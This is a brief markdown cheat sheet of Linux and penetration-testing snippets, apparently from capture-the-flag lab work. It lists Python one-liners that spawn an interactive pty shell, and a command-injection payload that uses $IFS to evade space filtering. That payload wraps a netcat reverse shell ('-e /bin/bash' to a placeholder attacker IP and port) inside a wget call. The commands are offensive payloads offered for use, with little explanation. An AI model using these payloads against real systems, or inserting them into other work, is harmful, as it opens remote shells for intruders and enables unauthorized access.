#linux
# Locations of files of an linux install
`apt-file list <packet>`

# Interactive Python pty
 #pty #shell
 
`python3 -c 'import pty; pty.spawn("/bin/sh")'`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`python -c 'import pty; pty.spawn("/bin/sh")'`

# Command injection space
#whitespace #commandinjection #ifs
Use `$IFS`.
Together with Netcat:
`wget http://10.10.14.XXX:8000/$(nc.traditional$IFS-e/bin/bash$IFS'10.10.14.XXX'$IFS'6666')`